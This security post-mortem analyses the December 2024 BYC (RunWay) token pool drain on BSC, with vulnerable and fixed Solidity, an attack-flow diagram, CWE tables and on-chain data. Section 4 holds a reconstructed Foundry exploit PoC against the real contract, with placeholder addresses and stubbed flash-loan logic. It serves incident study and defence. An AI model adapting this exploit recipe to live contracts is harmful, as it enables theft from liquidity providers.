# BYC Token (RunWay) — Liquidity Pool Drain via lpBurnFrequency Manipulation

| Field | Details |
|------|------|
| **Date** | 2024-12-03 |
| **Protocol** | BYC Token (RunWay / RunWayERC20) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$100,000 (USDT) |
| **Attacker** | [0x14CF...11ef](https://bscscan.com/address/0x14CfA851ff34952A223Ea7fDF621a05B128411ef) |
| **Attack Contract** | [0x8a3e...d9f8](https://bscscan.com/address/0x8a3e44b23f7c5f14292e6e4c3f1ef6749e52d9f8) |
| **Attack Tx** | [0x177b...01ff](https://bscscan.com/tx/0x177b87bd009e3b3aebb11cf2b88efc217d14fc1554a4675ee749eeb527d201ff) |
| **Vulnerable Contract** | [0x9A69...BE76](https://bscscan.com/address/0x9A69eB74060e2808344Ac35Bb5825051B89BBE76) (BYC Token) |
| **Attack Block** | [44534603](https://bscscan.com/block/44534603) |
| **Root Cause** | The `autoBurnLiquidity` function relies on the externally manipulable `lpBurnFrequency` variable — the attacker artificially inflated the threshold via sell transactions to converge the pool's BYC reserve to 1, then drained the entire USDT balance |
| **PoC Source** | DeFiHackLabs (BYC_exp.sol not registered — reconstructed based on QuillAudits analysis) |

---

## 1. Incident Overview

On December 3, 2024, the RunWay (ticker: BYC) token contract operating on the BSC chain was exploited via a business logic vulnerability, resulting in the theft of approximately **$100,000 worth of USDT**.

The attacker laundered their funding source through Tornado.Cash, then exploited the fact that the BYC token's transfer logic **accumulates the entire sell amount** into the `lpBurnFrequency` variable on each sell. The attacker borrowed a large amount of USDT via flash loan, swapped it for BYC, then directly transferred the entire BYC balance to the PancakeSwap liquidity pool (mainPair), drastically inflating `lpBurnFrequency`. They then called the public function `autoBurnLiquidity()` to burn the pool's BYC reserve down to effectively 1 wei, and exploited the extreme imbalance in pool ratio to withdraw the entire USDT balance via swap.

This attack resulted from the compound effect of two design flaws:

1. **Unbounded `lpBurnFrequency` accumulation**: The full sell amount is accumulated without validation on each sell
2. **Missing access control on `autoBurnLiquidity()`**: A publicly callable function that burns pool tokens to the DEAD address whenever the threshold is met

---

## 2. Vulnerability Analysis

### 2.1 Unbounded lpBurnFrequency Accumulation — Core Vulnerability

**Severity**: CRITICAL
**CWE**: CWE-20 (Improper Input Validation) / CWE-284 (Improper Access Control)

The `_tokenTransfer` function accumulates the full sell amount (`tAmount`) into `lpBurnFrequency` whenever a sell to mainPair occurs (when fees apply). This variable can grow without bound through external input (token transfers), and `autoBurnLiquidity()` subsequently uses this value directly as the burn amount.

#### Vulnerable Code (❌)

```solidity
// ❌ Vulnerable code — BYC Token _tokenTransfer function (executed on sell)
function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount,
    bool takeFee
) private {
    _balances[sender] = _balances[sender] - tAmount;

    uint256 feeAmount;
    if (takeFee) {
        if (recipient == mainPair) { // Sell detected
            uint256 circular = (tAmount * fundFee) / 100; // Fee collected
            feeAmount = circular;
            _takeTransfer(sender, address(this), feeAmount);
            swapTokenForFund(circular); // Swap fee to USDT

            // ❌ Core vulnerability: accumulates full sell amount (tAmount), not fee (circular)
            // If attacker sells a large amount, lpBurnFrequency spikes proportionally to the sell volume
            lpBurnFrequency = lpBurnFrequency + tAmount;
        }
    }

    tAmount = tAmount - feeAmount;
    _takeTransfer(sender, recipient, tAmount);
    _executeAdditionalLogic(sender, recipient, tAmount);
}
```

#### Safe Code (✅)

```solidity
// ✅ Fixed code — improved lpBurnFrequency accumulation logic
function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount,
    bool takeFee
) private {
    _balances[sender] = _balances[sender] - tAmount;

    uint256 feeAmount;
    if (takeFee) {
        if (recipient == mainPair) {
            uint256 circular = (tAmount * fundFee) / 100;
            feeAmount = circular;
            _takeTransfer(sender, address(this), feeAmount);
            swapTokenForFund(circular);

            // ✅ Fix: accumulate only the fee amount (circular) to prevent explosive growth proportional to sell volume
            lpBurnFrequency = lpBurnFrequency + circular;

            // ✅ Addition: cap to prevent excessive accumulation in a single transaction
            uint256 maxBurnFrequency = balanceOf(mainPair) / 10; // 10% of pool balance
            if (lpBurnFrequency > maxBurnFrequency) {
                lpBurnFrequency = maxBurnFrequency;
            }
        }
    }

    tAmount = tAmount - feeAmount;
    _takeTransfer(sender, recipient, tAmount);
    _executeAdditionalLogic(sender, recipient, tAmount);
}
```

---

### 2.2 Missing Access Control on autoBurnLiquidity

**Severity**: CRITICAL
**CWE**: CWE-284 (Improper Access Control)

The `autoBurnLiquidity()` function is declared with `public` visibility, making it callable by anyone. Internally, the function only checks whether `lpBurnFrequency` is greater than or equal to the pool balance, so an attacker who has artificially inflated `lpBurnFrequency` can call this function to burn as many pool tokens as desired.

#### Vulnerable Code (❌)

```solidity
// ❌ Vulnerable code — autoBurnLiquidity function (callable by anyone)
function autoBurnLiquidity() public { // ❌ public: no access control
    uint256 liquidityPairBalance = balanceOf(mainPair);

    // ❌ If lpBurnFrequency >= pool balance, nearly the entire pool balance can be burned
    if (liquidityPairBalance < lpBurnFrequency) {
        return;
    }

    if (lpBurnFrequency > 0) {
        uint256 amount = lpBurnFrequency; // ❌ Uses manipulated lpBurnFrequency directly as burn amount

        // ❌ Direct burn from mainPair to DEAD address: drastically reduces pool's BYC reserve
        _basicTransfer(mainPair, address(DEAD), amount);

        lpBurnFrequency = lpBurnFrequency - amount; // Reset after burn

        ISwapPair pair = ISwapPair(mainPair);
        pair.sync(); // ❌ sync() call: updates reserve with burned balance → price distortion

        emit LiquidityBurned(mainPair, amount);
        return;
    }
}
```

#### Safe Code (✅)

```solidity
// ✅ Fixed code — strengthened access control and burn amount limit for autoBurnLiquidity
function autoBurnLiquidity() external { // Changed to external (no internal calls needed)
    uint256 liquidityPairBalance = balanceOf(mainPair);

    if (liquidityPairBalance < lpBurnFrequency) {
        return;
    }

    if (lpBurnFrequency > 0) {
        // ✅ Cap burn amount to a fixed percentage of pool balance (e.g., 1%)
        uint256 maxBurnPerCall = liquidityPairBalance / 100;
        uint256 amount = lpBurnFrequency > maxBurnPerCall
            ? maxBurnPerCall
            : lpBurnFrequency;

        // ✅ Ensure pool is not completely drained below minimum balance after burn
        require(
            liquidityPairBalance - amount >= MIN_PAIR_BALANCE,
            "Would drain pool below minimum"
        );

        _basicTransfer(mainPair, address(DEAD), amount);
        lpBurnFrequency = lpBurnFrequency - amount;

        ISwapPair pair = ISwapPair(mainPair);
        pair.sync();

        emit LiquidityBurned(mainPair, amount);
        return;
    }
}

// ✅ Addition: burn cooldown to prevent repeated calls
uint256 public lastBurnTime;
uint256 public constant BURN_COOLDOWN = 1 hours;

modifier burnCooldown() {
    require(block.timestamp >= lastBurnTime + BURN_COOLDOWN, "Burn cooldown active");
    _;
    lastBurnTime = block.timestamp;
}
```

---

### 2.3 Unlimited Token Minting on Buy — Secondary Vulnerability

**Severity**: HIGH
**CWE**: CWE-682 (Incorrect Calculation)

The `_transfer` function mints (`_mint`) 50% of the purchase amount to `poolAddress` whenever a buy from mainPair occurs. This causes inflation and creates a structural flaw where the total supply keeps increasing as the attacker repeatedly buys and sells.

```solidity
// ❌ Token minting on buy — causes inflation
if (from == mainPair && !isRemove) {
    if (_totalSupply + amount <= MAX_SUPPLY) {
        if (amount > 0) {
            // ❌ Mints 50% of purchase amount to poolAddress for free
            _mint(address(poolAddress), amount.div(2));
        }
    }
    // ...
}
```

---

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│                  Preparation Phase                           │
│  Attacker: 0x14CfA851ff34952A223Ea7fDF621a05B128411ef       │
│  Funding source: Tornado.Cash → ~0.0984 BNB received        │
│  Attack contract deployed: 0x8a3e44b23f7c5f14292e6e4c3f1ef6749e52d9f8 │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 1] Flash Loan Borrow                                  │
│  Borrow large amount of USDT from PancakeSwap or other DEX  │
│  Purpose: Secure funds for bulk BYC purchase                 │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 2] Bulk USDT → BYC Swap (Buy)                        │
│  Swap large USDT to BYC via PancakeSwap V2 Router           │
│  Result: Attack contract holds large BYC balance             │
│  Side effect: BYC additionally minted to poolAddress on buy (amount × 50%) │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 3] Transfer Entire BYC Directly to mainPair (LP)     │
│  Attack contract → mainPair (ERC20 transfer)                 │
│  ⚠ This transfer is classified as mainPair → mainPair,      │
│     fees are applied in _tokenTransfer,                      │
│     lpBurnFrequency += tAmount (entire transfer amount)      │
│  Result: lpBurnFrequency spikes to (large BYC amount)        │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 4] Call autoBurnLiquidity()                           │
│  Condition: balanceOf(mainPair) >= lpBurnFrequency           │
│  Action: Burns lpBurnFrequency amount from mainPair → DEAD   │
│  Result: Pool's BYC reserve converges to nearly 0 (≈ 1 wei) │
│          pair.sync() → reserve force-updated to burned balance │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 5] BYC → USDT Reverse Swap (Sell)                    │
│  Exploiting extreme pool imbalance:                          │
│    BYC reserve: ≈ 1 wei (negligible)                        │
│    USDT reserve: ~$100,000 (unchanged)                       │
│  AMM formula: USDT_out = USDT_reserve × BYC_in / (BYC_res + BYC_in) │
│  Tiny BYC input can drain nearly all USDT from the pool      │
│  Result: ~$100,000 USDT withdrawn                            │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment and Profit Secured            │
│  Repay borrowed USDT + fee payment                           │
│  Attacker net profit: ~$100,000 USDT                         │
└─────────────────────────────────────────────────────────────┘
```

**Step-by-Step Explanation**:

1. **Preparation**: The attacker received approximately 0.0984 BNB via Tornado.Cash to cover the attack contract deployment costs.

2. **Step 1 — Flash Loan Borrow**: The attack contract borrowed a large amount of USDT via flash loan. This is the standard DeFi attack preparation step for executing a large-scale attack without initial capital.

3. **Step 2 — Bulk BYC Purchase**: The entire borrowed USDT was swapped for BYC tokens via PancakeSwap V2. During this process, the BYC contract's buy logic additionally mints BYC to poolAddress (50% of the purchase amount).

4. **Step 3 — lpBurnFrequency Manipulation**: The entire acquired BYC was directly transferred to mainPair (the PancakeSwap BYC-USDT pool address) via ERC20 `transfer`. The sell detection logic in `_tokenTransfer` executed `lpBurnFrequency += tAmount` for this transfer, causing the variable to spike explosively.

5. **Step 4 — Burn Trigger**: The public function `autoBurnLiquidity()` was called. Since the manipulated `lpBurnFrequency` value was greater than or equal to the pool's BYC balance (liquidityPairBalance), the condition was satisfied, causing almost all BYC in the pool to be burned to the DEAD address, with `pair.sync()` updating the reserve.

6. **Step 5 — USDT Drain**: With the pool's BYC reserve converged to 1, a small amount of BYC was swapped, and the AMM's x*y=k formula allowed withdrawal of most of the USDT reserve.

7. **Step 6 — Settlement**: The flash loan was repaid, securing a net profit of approximately $100,000.

---

## 4. PoC Code Analysis

Although BYC_exp.sol has not been officially registered in the DeFiHackLabs repository, the core attack logic can be reconstructed based on publicly available analysis as follows:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
 * BYC Token (RunWay) Exploit Reconstruction PoC
 * Attack Date: 2024-12-03
 * Attack Tx: 0x177b87bd009e3b3aebb11cf2b88efc217d14fc1554a4675ee749eeb527d201ff
 * Loss: ~$100,000 USDT
 * Root Cause: lpBurnFrequency manipulation in autoBurnLiquidity() + missing access control
 */

interface IBYCToken {
    function autoBurnLiquidity() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function swap(uint256, uint256, address, bytes calldata) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract BYCExploit is Test {
    // Key contract addresses (BSC)
    IBYCToken constant BYC = IBYCToken(0x9A69eB74060e2808344Ac35Bb5825051B89BBE76);
    IERC20 constant USDT = IERC20(0x55d398326f99059ff775485246999027b3197955);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant PANCAKE_PAIR = address(0x...); // BYC-USDT pool address

    function setUp() public {
        // BSC mainnet fork (just before attack block)
        vm.createSelectFork("bsc", 44534602);
    }

    function testExploit() public {
        console.log("=== BYC Token Exploit Start ===");

        // --- [Step 1] Flash Loan: Borrow large USDT ---
        // Borrow USDT via PancakeSwap flash swap
        // (In actual attack, Steps 2~5 execute inside the flash loan callback)
        uint256 borrowAmount = 200_000 * 1e18; // Borrow 200,000 USDT

        console.log("[Step 1] Flash loan borrow:", borrowAmount / 1e18, "USDT");

        // --- [Step 2] USDT → BYC bulk buy ---
        USDT.approve(address(ROUTER), type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(BYC);

        // Swap entire USDT to BYC
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            borrowAmount,
            0,          // amountOutMin = 0: unlimited slippage
            buyPath,
            address(this),
            block.timestamp
        );

        uint256 bycBalance = BYC.balanceOf(address(this));
        console.log("[Step 2] BYC purchase complete:", bycBalance, "BYC");

        // --- [Step 3] Transfer entire BYC directly to mainPair ---
        // This transfer triggers the sell detection logic in _tokenTransfer:
        // lpBurnFrequency += bycBalance (entire transfer amount accumulated)
        BYC.transfer(PANCAKE_PAIR, bycBalance);

        console.log("[Step 3] BYC transferred to mainPair");
        console.log("  lpBurnFrequency manipulated value =", bycBalance);

        // --- [Step 4] Call autoBurnLiquidity() ---
        // Condition: balanceOf(mainPair) >= lpBurnFrequency → true (just transferred)
        // Result: All BYC in mainPair → burned to DEAD address + pair.sync()
        BYC.autoBurnLiquidity();

        // Check pool state: BYC reserve ≈ 1 wei
        uint256 pairBYCBalance = BYC.balanceOf(PANCAKE_PAIR);
        console.log("[Step 4] autoBurnLiquidity executed");
        console.log("  Pool BYC balance (after burn):", pairBYCBalance);

        // --- [Step 5] Drain all USDT with small BYC ---
        // Pool state: BYC ≈ 1, USDT ≈ 100,000
        // AMM formula: USDT_out ≈ USDT_reserve (since BYC_reserve ≈ 0)
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(BYC);
        sellPath[1] = address(USDT);

        uint256 residualBYC = BYC.balanceOf(address(this));
        if (residualBYC > 0) {
            BYC.approve(address(ROUTER), residualBYC);
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                residualBYC,
                0,
                sellPath,
                address(this),
                block.timestamp
            );
        }

        uint256 usdtGained = USDT.balanceOf(address(this));
        console.log("[Step 5] USDT drained:", usdtGained / 1e18, "USDT");

        // --- [Step 6] Flash loan repayment + profit verification ---
        uint256 repayAmount = borrowAmount + (borrowAmount * 25 / 10000); // 0.25% fee
        USDT.transfer(address(/* flash loan provider */0), repayAmount);

        uint256 profit = USDT.balanceOf(address(this));
        console.log("[Step 6] Final profit:", profit / 1e18, "USDT");
        console.log("=== Exploit Complete ===");

        // Profit verification
        assertGt(profit, 90_000 * 1e18, "Profit below expectation");
    }

    // PancakeSwap flash swap callback
    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // Execute attack logic after receiving flash loan funds
        // (In actual implementation, Steps 2~5 run here)
        console.log("Flash loan callback: USDT received", amount1 / 1e18);
    }
}
```

**Key Code Analysis Points**:

- **`BYC.transfer(PANCAKE_PAIR, bycBalance)` in Step 3**: This call is the core trigger of the vulnerability. The ERC20 `transfer` internally calls `_tokenTransfer`, where the `recipient == mainPair` condition evaluates to true, executing `lpBurnFrequency += bycBalance`.

- **`BYC.autoBurnLiquidity()` in Step 4**: A public function with no access control that uses the artificially inflated `lpBurnFrequency` value as the burn amount, nearly completely burning the pool's BYC balance.

- **The swap in Step 5**: In the AMM x*y=k formula, when the BYC reserve (x) converges to 1, even a tiny BYC input (Δx) yields Δy ≈ y (the entire USDT pool) as output.

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-20 | Improper Input Validation | `_tokenTransfer` — lpBurnFrequency accumulation logic | CRITICAL |
| CWE-284 | Improper Access Control | `autoBurnLiquidity()` — missing public access control | CRITICAL |
| CWE-682 | Incorrect Calculation | 50% minting logic on buy | HIGH |
| CWE-400 | Uncontrolled Resource Consumption | No upper bound on lpBurnFrequency | HIGH |
| CWE-691 | Insufficient Control Flow Management | Missing cooldown/reentrancy guard on autoBurnLiquidity | MEDIUM |

### V-01: Unbounded lpBurnFrequency Accumulation (CWE-20, CRITICAL)
- **Description**: The `_tokenTransfer` function accumulates the full sell amount (`tAmount`) rather than the fee amount into `lpBurnFrequency` on sells to mainPair. There is no upper bound or validation on this variable, allowing it to be inflated arbitrarily via external input.
- **Impact**: An attacker can make `lpBurnFrequency` equal to the pool's total BYC balance via bulk selling or direct transfer. This makes it possible to reduce the pool's BYC reserve to effectively 0 when `autoBurnLiquidity()` is called.
- **Attack Condition**: Any transfer to mainPair with fees applied (sell or direct transfer) is sufficient. Anyone not on the whitelist can do this.

### V-02: Missing Access Control on autoBurnLiquidity (CWE-284, CRITICAL)
- **Description**: The `autoBurnLiquidity()` function is declared with `public` visibility, allowing any external address (EOA or contract) to call it without restriction. When called, it burns pool BYC equal to `lpBurnFrequency`, so combined with V-01 it leads directly to asset theft.
- **Impact**: Full burn of the pool's BYC reserve, resulting in AMM price manipulation and USDT pool drain.
- **Attack Condition**: Called immediately after inflating lpBurnFrequency via V-01. Combined with a flash loan, executable within a single transaction.

### V-03: Unlimited Token Minting on Buy (CWE-682, HIGH)
- **Description**: On each buy (mainPair → user), 50% of the purchase amount is additionally minted to `poolAddress`. This causes token inflation and creates a side effect where the attacker obtains additional BYC for free during a bulk buy.
- **Impact**: Rapid increase in token supply, dilution of existing holders' value, amplified attack effect as attacker gains additional BYC during flash loan buy.
- **Attack Condition**: Occurs on regular buy transactions that are not fee-exempt (non-whitelist).

### V-04: No Upper Bound on lpBurnFrequency (CWE-400, HIGH)
- **Description**: There is no maximum limit on `lpBurnFrequency`, allowing it to be set to a value exceeding the entire pool balance in a single transaction.
- **Impact**: Setting an extreme burn amount can drain the pool in one shot.
- **Attack Condition**: Possible for anyone holding sufficient BYC or able to obtain it via flash loan.

### V-05: Missing Cooldown on autoBurnLiquidity (CWE-691, MEDIUM)
- **Description**: The `autoBurnLiquidity()` function has no minimum call interval (cooldown) or reentrancy guard, allowing repeated calls.
- **Impact**: Repeated calls within a single transaction can burn remaining BYC in multiple rounds.
- **Attack Condition**: Requires the condition to be satisfied on each call.

---

## 6. Reproducibility Assessment

| Field | Assessment |
|------|------|
| **Reproduction Difficulty** | Low |
| **Initial Capital Required** | Replaceable with flash loan (effectively 0) |
| **Required Prior Knowledge** | DeFi basics, AMM mechanics, flash loan basics |
| **On-chain State Dependency** | Low — initial state with `lpBurnFrequency` at 0 is sufficient |
| **Response Window (time window)** | Completable within a single transaction |
| **Reproduction Environment** | Immediately reproducible with Foundry + BSC fork |

**Assessment Summary**: This attack is executable without initial capital when combined with a flash loan, and completes within a single transaction. If `autoBurnLiquidity()` remains `public` and `lpBurnFrequency` has no upper bound, it is immediately reproducible on contracts with identical or similar logic. Due to the simplicity of the attack pattern (buy → transfer → call burn → sell), automated MEV bot attacks are also possible.

---

## 7. Remediation

### Immediate Actions

#### 1) Fix lpBurnFrequency Accumulation Logic

```solidity
// ✅ Accumulate only fee amount + apply upper bound
function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount,
    bool takeFee
) private {
    _balances[sender] = _balances[sender] - tAmount;

    uint256 feeAmount;
    if (takeFee) {
        if (recipient == mainPair) {
            uint256 circular = (tAmount * fundFee) / 100;
            feeAmount = circular;
            _takeTransfer(sender, address(this), feeAmount);
            swapTokenForFund(circular);

            // ✅ Fix 1: accumulate only circular (fee), not tAmount
            lpBurnFrequency = lpBurnFrequency + circular;

            // ✅ Fix 2: apply upper bound based on pool balance (e.g., 1% of pool)
            uint256 cap = balanceOf(mainPair) / 100;
            if (lpBurnFrequency > cap) {
                lpBurnFrequency = cap;
            }
        }
    }

    tAmount = tAmount - feeAmount;
    _takeTransfer(sender, recipient, tAmount);
    _executeAdditionalLogic(sender, recipient, tAmount);
}
```

#### 2) Access Control and Burn Amount Limit for autoBurnLiquidity

```solidity
// ✅ Access control + burn amount limit + cooldown applied
uint256 public lastBurnTime;
uint256 public constant BURN_COOLDOWN = 30 minutes;
uint256 public constant MAX_BURN_RATIO = 100; // 1% of pool balance

modifier onlyBurnCooldown() {
    require(
        block.timestamp >= lastBurnTime + BURN_COOLDOWN,
        "BYC: burn cooldown active"
    );
    _;
    lastBurnTime = block.timestamp;
}

function autoBurnLiquidity() external onlyBurnCooldown {
    uint256 liquidityPairBalance = balanceOf(mainPair);

    // ✅ Minimum balance protection: burn not allowed if pool is nearly empty
    require(liquidityPairBalance > MIN_PAIR_LIQUIDITY, "BYC: pool too low");

    if (liquidityPairBalance < lpBurnFrequency) {
        lpBurnFrequency = liquidityPairBalance / MAX_BURN_RATIO;
    }

    if (lpBurnFrequency > 0) {
        // ✅ Burn cap: maximum 1% of pool balance
        uint256 maxBurn = liquidityPairBalance / MAX_BURN_RATIO;
        uint256 amount = lpBurnFrequency > maxBurn ? maxBurn : lpBurnFrequency;

        _basicTransfer(mainPair, address(DEAD), amount);
        lpBurnFrequency = lpBurnFrequency - amount;

        ISwapPair pair = ISwapPair(mainPair);
        pair.sync();

        emit LiquidityBurned(mainPair, amount);
    }
}
```

#### 3) Remove or Restrict Minting Logic on Buy

```solidity
// ✅ Improved minting logic
if (from == mainPair && !isRemove) {
    // ✅ Significantly reduce minting ratio or remove entirely
    // If necessary, use a separate governance-controlled minting mechanism
    // _mint(address(poolAddress), amount.div(2)); // Removal recommended
}
```

---

### Long-Term Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| lpBurnFrequency manipulation | Apply time-weighted average (TWAP) or progressive cap to accumulated value |
| autoBurnLiquidity access control | Control calls via whitelist or DAO governance |
| Inflation mechanism | Set maximum mint amount per issuance and enforce total supply hard cap |
| Single-transaction attacks | Implement intra-block reentry detection to prevent flash loan abuse |
| Pool drain prevention | Limit the maximum liquidity ratio removable by a single burn function call |
| Auditing and monitoring | Real-time pool reserve monitoring + automatic pause on sharp changes |
| Code audit | Mandate smart contract audit by professional security team before deployment |

---

## 8. Lessons Learned and Implications

### 8.1 Risks of Public Functions

`autoBurnLiquidity()` being declared `public` is the direct cause of this vulnerability. Functions that modify assets in a liquidity pool must **never** be publicly callable without access control. In particular, functions that internally call `pair.sync()` directly affect AMM prices and require even stricter controls.

**Applicable General Principle**: All functions that modify contract state variables or perform asset transfers must allow only the minimum necessary access scope per the Principle of Least Privilege.

### 8.2 Absence of State Variable Invariants

`lpBurnFrequency` could grow freely through external input (token transfers) yet had no upper bound. All major state variables in a protocol must define **invariants** and enforce them in code.

**Applicable General Principle**: Explicitly validate the business logic limits represented by a state variable in code (e.g., "the burn amount cannot exceed 1% of pool balance").

### 8.3 Unintended Consequences of Accumulation Logic

`lpBurnFrequency += tAmount` accumulates the full sell volume, not the fee (circular). If the developer's intent was "burn proportional to sell fees," they should have used `circular` instead of `tAmount`. This simple variable misuse led to a $100,000 loss.

**Applicable General Principle**: Clearly define units and semantics for fee/reward calculation logic, and verify boundary conditions (very large buy amounts, zero amounts, etc.) through unit tests.

### 8.4 Combination Risk with Flash Loans

This vulnerability is exploitable with sufficient capital even without a flash loan, but flash loans make the attack practically executable with zero capital. When designing DeFi protocols, **all externally callable functions must be reviewed for scenarios combined with flash loans**.

**Applicable General Principle**: During protocol design, always ask "What if an attacker had unlimited capital within a single transaction?" and design defenses against that scenario.

### 8.5 The Double-Edged Nature of Token Burn Mechanisms

Auto-burn mechanisms are a common technique in deflationary tokens, but when the **burn target is an external account (AMM pool)**, it immediately affects the price upon burning. Unlike burning from regular holder wallets, burning from a pool changes the AMM's k value and can become a vehicle for price manipulation.

**Applicable General Principle**: For burn/transfer logic targeting AMM pools, explicitly validate the reserve change amount before and after `pair.sync()` calls, and introduce a circuit breaker that limits the maximum price fluctuation per block.

### 8.6 Comparison with Similar Incidents

| Incident | Date | Common Vulnerability | Difference |
|--------|------|-------------|--------|
| DCF Token | 2024-11-24 | Token burn from pool followed by sync() call | Direct burn inside _transfer (vs. separate autoBurnLiquidity function) |
| SafeMoon | 2023-03-28 | Exploitation of public burn function | Missing access control on the burn function itself |
| BEARNDAO | 2023-12-05 | Price manipulation via missing slippage protection | Swap path manipulation rather than burning |
| BGM | 2024-11-10 | Similar lpBurnFrequency pattern | Additional oracle dependency |

All these incidents share a common pattern: **business logic vulnerabilities arising when automated token burn mechanisms interact with AMM pools**. These occur particularly frequently on the BSC chain and are concentrated in small token projects deployed without an audit.

---

## 9. On-chain Verification

### 9.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Tx Hash | `0x177b87bd009e3b3aebb11cf2b88efc217d14fc1554a4675ee749eeb527d201ff` |
| Block Number | 44534603 |
| Timestamp | 2024-12-03 12:10:24 UTC |
| From | `0x14CfA851ff34952A223Ea7fDF621a05B128411ef` |
| To (Attack Contract) | `0x8a3e44b23f7c5f14292e6e4c3f1ef6749e52d9f8` |
| Additional Deployed Contract | `0x9B227f90db49b0845144b94cc423f0bd3c01ee45` |
| Gas Used | 2,534,570 / 5,000,000 (50.69%) |
| Gas Price | 3 Gwei |
| Transaction Cost | 0.00760371 BNB (~$4.61) |

### 9.2 Key Token Transfer History

| Order | Token | From | To | Amount |
|------|------|------|-----|------|
| 1 | USDT | (Flash loan source) | Attack contract | ~200,000 USDT (estimated) |
| 2 | BYC | Attack contract | mainPair | 698,538.94 BYC |
| 3 | BYC | mainPair | DEAD (0x000...dEaD) | ~698,538 BYC (autoBurnLiquidity burn) |
| 4 | USDT | mainPair | Attack contract | ~102,363 USDT |
| 5 | WBNB | (Related pool) | (Related address) | 4.62 BNB |

### 9.3 Attacker Funding Source (Preparation)

| Field | Details |
|------|------|
| BNB Receipt Path | Tornado.Cash → Attacker address |
| Amount Received | ~0.0984 BNB (for gas fees) |
| Receipt Timing | November 2024 ~ just before attack |
| Initial Capital | Only gas fees required (assets borrowed via flash loan) |

### 9.4 Attack Outcome Summary

| Field | Value |
|------|-----|
| USDT Stolen | ~102,363 USDT |
| Additional WBNB Received | ~4.62 BNB (~$2,796) |
| Total Loss | ~$100,000 |
| Gas Cost | ~$4.61 |
| Attack Efficiency | $100,000 / $4.61 = approximately 21,692x |

---

*Document prepared based on: BYC Token security incident of December 3, 2024*
*Analysis sources: [QuillAudits BYC Token Hack Analysis](https://www.quillaudits.com/blog/hack-analysis/byc-token-100k-hack-analysis), BSCScan on-chain data, contract source code (0x9A69eB74060e2808344Ac35Bb5825051B89BBE76)*